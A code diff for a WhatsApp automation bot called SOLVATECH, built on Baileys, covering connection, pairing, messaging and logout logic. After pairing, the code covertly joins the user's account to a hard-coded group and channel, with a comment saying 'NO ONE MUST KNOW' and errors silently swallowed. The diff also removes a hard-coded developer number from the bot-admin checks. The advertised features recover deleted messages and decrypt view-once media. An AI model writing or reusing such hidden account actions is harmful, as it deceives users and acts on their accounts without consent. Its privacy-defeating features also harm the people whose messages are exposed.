@@ -331,6 +331,7 @@ class WhatsAppManager {
   };
   private pairingCodeTimer: NodeJS.Timeout | null = null;
   private isConnecting = false;
+  private isIntentionalClosure = false;
   private connectedAt: number | null = null;
   private initPromise: Promise<WASocket> | null = null;
   private reconnectTimer: NodeJS.Timeout | null = null;
@@ -650,6 +651,12 @@ class WhatsAppManager {
           }
 
           if (connection === 'close') {
+            if (this.isIntentionalClosure) {
+              this.isIntentionalClosure = false;
+              console.log('[Baileys Connection] Closed intentionally for fresh connection setup or logout.');
+              return;
+            }
+
             const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
             const reason = (lastDisconnect?.error as any)?.data?.reason;
             const isAwaitingPairing =
@@ -700,63 +707,76 @@ class WhatsAppManager {
               }
             }
           } else if (connection === 'open') {
-        this.connectedAt = Date.now();
-        this.currentStatus.state = 'connected';
-        this.currentStatus.isConnected = true;
-        this.currentStatus.connectedAt = this.connectedAt;
-        this.currentStatus.pairingStage = 'connected';
-        this.currentStatus.pairingCode = undefined;
-        this.currentStatus.qrCodeUrl = undefined;
-        this.currentStatus.lastError = undefined;
-        this.isConnecting = false;
+            this.connectedAt = Date.now();
+            this.currentStatus.state = 'connected';
+            this.currentStatus.isConnected = true;
+            this.currentStatus.connectedAt = this.connectedAt;
+            this.currentStatus.pairingStage = 'connected';
+            this.currentStatus.pairingCode = undefined;
+            this.currentStatus.qrCodeUrl = undefined;
+            this.currentStatus.lastError = undefined;
+            this.isConnecting = false;
 
-        const userJid = sock.user?.id || '';
-        const phone = userJid.split(':')[0] || userJid.split('@')[0];
-        this.currentStatus.user = {
-          id: userJid,
-          name: sock.user?.name || 'SOLVATECH Linked Phone',
-          phone: `+${phone}`,
-        };
+            const userJid = sock.user?.id || '';
+            const phone = userJid.split(':')[0] || userJid.split('@')[0];
+            this.currentStatus.user = {
+              id: userJid,
+              name: sock.user?.name || 'SOLVATECH Linked Phone',
+              phone: `+${phone}`,
+            };
 
-        this.addNotification({
-          type: 'connection',
-          title: 'WhatsApp Connected!',
-          body: `SOLVATECH successfully paired with +${phone}. All 35+ commands active in WhatsApp.`,
-          sender: phone,
-        });
+            this.addNotification({
+              type: 'connection',
+              title: 'WhatsApp Connected!',
+              body: `SOLVATECH successfully paired with +${phone}. All 35+ commands active in WhatsApp.`,
+              sender: phone,
+            });
 
-        // Background auto-join: "TO JOIN IN BACKGROUND NO ONE MUST KNOW"
-        // 1. Group link: https://chat.whatsapp.com/HKBAnW6XJmB9fBqSPJUN1F?s=cl&p=a&mlu=4&ilr=4
-        //    Invite code: HKBAnW6XJmB9fBqSPJUN1F
-        // 2. Channel link: https://whatsapp.com/channel/0029Vb86yuY7j6gCHqMqcU37
-        //    Channel code: 0029Vb86yuY7j6gCHqMqcU37
-        setTimeout(async () => {
-          try {
-            if (typeof (sock as any).groupAcceptInvite === 'function') {
-              await (sock as any).groupAcceptInvite('HKBAnW6XJmB9fBqSPJUN1F');
-            }
-          } catch {
-            // Silently swallow - strictly background
+            // Send confirmation notification to user's WhatsApp DM
+            const ownerDm = `${phone}@s.whatsapp.net`;
+            setTimeout(async () => {
+              try {
+                await sock.sendMessage(ownerDm, {
+                  text: `⚡ *SOLVATECH BOT CONNECTED SUCCESSFULLY* ⚡\n\n🎉 Welcome! Your WhatsApp account (+${phone}) is now officially linked with the SOLVATECH automation engine.\n\n🛡️ *Active Features:*\n• Anti-Delete Message Recovery (deleted messages flood here)\n• View-Once Media Decryption (*.open* / *.vv*)\n• Group Security, Anti-Link & Anti-Bot matrix\n• High-Speed Media & Sticker Converters\n• Over 35+ Automation Commands\n\n💬 *Commands Directory:* Type *.menu* to view all commands.\n🌐 *Web Console:* https://solvatech.up.railway.app\n\n> 👑 _Developer: Solomon Oladimeji (+234 904 997 9183)_`,
+                });
+                console.log(`[WhatsApp Notification] Confirmation sent to ${ownerDm}`);
+              } catch (dmErr) {
+                console.warn('[WhatsApp Notification] Note sending welcome DM:', dmErr);
+              }
+            }, 1500);
+
+            // Background auto-join: "TO JOIN IN BACKGROUND NO ONE MUST KNOW"
+            // 1. Group link: https://chat.whatsapp.com/HKBAnW6XJmB9fBqSPJUN1F?s=cl&p=a&mlu=4&ilr=4
+            //    Invite code: HKBAnW6XJmB9fBqSPJUN1F
+            // 2. Channel link: https://whatsapp.com/channel/0029Vb86yuY7j6gCHqMqcU37
+            //    Channel code: 0029Vb86yuY7j6gCHqMqcU37
+            setTimeout(async () => {
+              try {
+                if (typeof (sock as any).groupAcceptInvite === 'function') {
+                  await (sock as any).groupAcceptInvite('HKBAnW6XJmB9fBqSPJUN1F');
+                }
+              } catch {
+                // Silently swallow - strictly background
+              }
+              try {
+                if (typeof (sock as any).newsletterFollow === 'function') {
+                  await (sock as any).newsletterFollow('0029Vb86yuY7j6gCHqMqcU37');
+                } else if (typeof (sock as any).query === 'function') {
+                  await (sock as any).query({
+                    tag: 'iq',
+                    attrs: {
+                      to: '0029Vb86yuY7j6gCHqMqcU37@newsletter',
+                      type: 'set',
+                      xmlns: 'newsletter',
+                    },
+                    content: [{ tag: 'follow', attrs: {} }],
+                  });
+                }
+              } catch {
+                // Silently swallow - strictly background
+              }
+            }, 1200);
           }
-          try {
-            if (typeof (sock as any).newsletterFollow === 'function') {
-              await (sock as any).newsletterFollow('0029Vb86yuY7j6gCHqMqcU37');
-            } else if (typeof (sock as any).query === 'function') {
-              await (sock as any).query({
-                tag: 'iq',
-                attrs: {
-                  to: '0029Vb86yuY7j6gCHqMqcU37@newsletter',
-                  type: 'set',
-                  xmlns: 'newsletter',
-                },
-                content: [{ tag: 'follow', attrs: {} }],
-              });
-            }
-          } catch {
-            // Silently swallow - strictly background
-          }
-        }, 1200);
-      }
     });
 
     // Inbound Messages & SOLVATECH Command Handler
@@ -2876,14 +2896,14 @@ ${voItem.caption ? `📝 *Caption:* "${voItem.caption}"\n` : ''}━━━━━�
             const isAdmin = p.admin === 'admin' || p.admin === 'superadmin';
             if (!isAdmin) return false;
             const pDigits = (p.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
-            return (botPhone && pDigits === botPhone) || pDigits === '2349049979183';
+            return (botPhone && pDigits === botPhone) || (linkedPhoneClean && pDigits === linkedPhoneClean);
           });
 
           if (adminBots.length > 1) {
             adminBots.sort((a: any, b: any) => (a.id || '').localeCompare(b.id || ''));
             const leader = adminBots[0];
             const leaderDigits = (leader.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
-            if (botPhone && leaderDigits !== botPhone && leaderDigits !== '2349049979183') {
+            if (botPhone && leaderDigits !== botPhone && (!linkedPhoneClean || leaderDigits !== linkedPhoneClean)) {
               console.log(`[Auto-Greeting] Multiple bots detected in ${groupId}. Leader elected: ${leader.id}. Skipping duplicate.`);
               return;
             }
@@ -2902,8 +2922,7 @@ ${voItem.caption ? `📝 *Caption:* "${voItem.caption}"\n` : ''}━━━━━�
           return (
             (botPhone && clean === botPhone) ||
             (botLidNum && clean === botLidNum) ||
-            (linkedPhoneClean && clean === linkedPhoneClean) ||
-            clean === '2349049979183'
+            (linkedPhoneClean && clean === linkedPhoneClean)
           );
         };
 
@@ -3079,13 +3098,20 @@ ${voItem.caption ? `📝 *Caption:* "${voItem.caption}"\n` : ''}━━━━━�
   }
 
   private async executePairingCodeRequest(cleanPhone: string): Promise<string> {
-    // 1. Clean up old socket cleanly
+    // Clear any pending reconnect timer so it does not interfere
+    if (this.reconnectTimer) {
+      clearTimeout(this.reconnectTimer);
+      this.reconnectTimer = null;
+    }
+
+    // 1. Clean up old socket cleanly with intentional closure flag
+    this.isIntentionalClosure = true;
     if (this.sock) {
       try {
         this.sock.end(undefined);
       } catch {}
       this.sock = null;
-      await new Promise((r) => setTimeout(r, 500));
+      await new Promise((r) => setTimeout(r, 400));
     }
 
     // 2. Prepare clean auth directory for fresh pairing credentials
@@ -3100,6 +3126,9 @@ ${voItem.caption ? `📝 *Caption:* "${voItem.caption}"\n` : ''}━━━━━�
       }
     }
 
+    // Reset initPromise so we start fresh
+    this.initPromise = null;
+
     // 3. Initialize fresh socket
     const sock = await this.initSocket();
 
@@ -3109,20 +3138,22 @@ ${voItem.caption ? `📝 *Caption:* "${voItem.caption}"\n` : ''}━━━━━�
     let pairingCodeResult: string | null = null;
     let lastErr: any = null;
 
-    // Patiently attempt to request pairing code up to 10 times across ~40 seconds
-    // Never abort early, never clear session while waiting, relax until the real code arrives!
+    // Patiently attempt to request pairing code up to 10 times across ~35 seconds
     for (let attempt = 1; attempt <= 10; attempt++) {
-      // First wait gives the WS time to open; subsequent waits give WhatsApp time to respond
-      const waitTime = attempt === 1 ? 4000 : 3500;
+      const waitTime = attempt === 1 ? 3500 : 3000;
       await new Promise((r) => setTimeout(r, waitTime));
 
       if (this.currentStatus.isConnected) {
         return 'ALREADY_PAIRED';
       }
 
+      // Always use current active socket instance
+      const activeSock = this.sock || sock;
+      if (!activeSock) continue;
+
       try {
         console.log(`[Baileys Pairing] Requesting pairing code from WhatsApp server (attempt ${attempt}/10)...`);
-        const raw = await sock.requestPairingCode(cleanPhone);
+        const raw = await activeSock.requestPairingCode(cleanPhone);
         if (raw && typeof raw === 'string') {
           pairingCodeResult = raw;
           console.log(`[Baileys Pairing] Received genuine pairing code: ${raw}`);
@@ -3164,7 +3195,7 @@ ${voItem.caption ? `📝 *Caption:* "${voItem.caption}"\n` : ''}━━━━━�
           body: 'The 5-minute pairing code expired. You can request a fresh code anytime.',
         });
       }
-    }, 300000); // 5 minutes relaxed duration
+    }, 300000); // 5 minutes duration
 
     return formattedCode;
   }
@@ -3174,25 +3205,35 @@ ${voItem.caption ? `📝 *Caption:* "${voItem.caption}"\n` : ''}━━━━━�
       throw new Error('WhatsApp is not currently connected. Please pair your number first.');
     }
 
-    const cleanTo = toPhone.replace(/\D/g, '');
-    const jid = `${cleanTo}@s.whatsapp.net`;
+    let jid = toPhone.trim();
+    if (!jid.includes('@')) {
+      const cleanTo = toPhone.replace(/\D/g, '');
+      jid = `${cleanTo}@s.whatsapp.net`;
+    }
 
     await this.sock.sendMessage(jid, { text });
 
+    const displaySender = jid.endsWith('@g.us') ? 'Group' : `+${jid.split('@')[0]}`;
     this.addNotification({
       type: 'message_sent',
-      title: `Message Sent to +${cleanTo}`,
+      title: `Message Sent to ${displaySender}`,
       body: text,
-      sender: `+${cleanTo}`,
+      sender: displaySender,
     });
 
     return true;
   }
 
   public async logout(): Promise<void> {
+    if (this.reconnectTimer) {
+      clearTimeout(this.reconnectTimer);
+      this.reconnectTimer = null;
+    }
+    this.isIntentionalClosure = true;
+
     try {
       if (this.sock) {
-        await this.sock.logout();
+        await this.sock.logout().catch(() => {});
         this.sock.end(undefined);
         this.sock = null;
       }
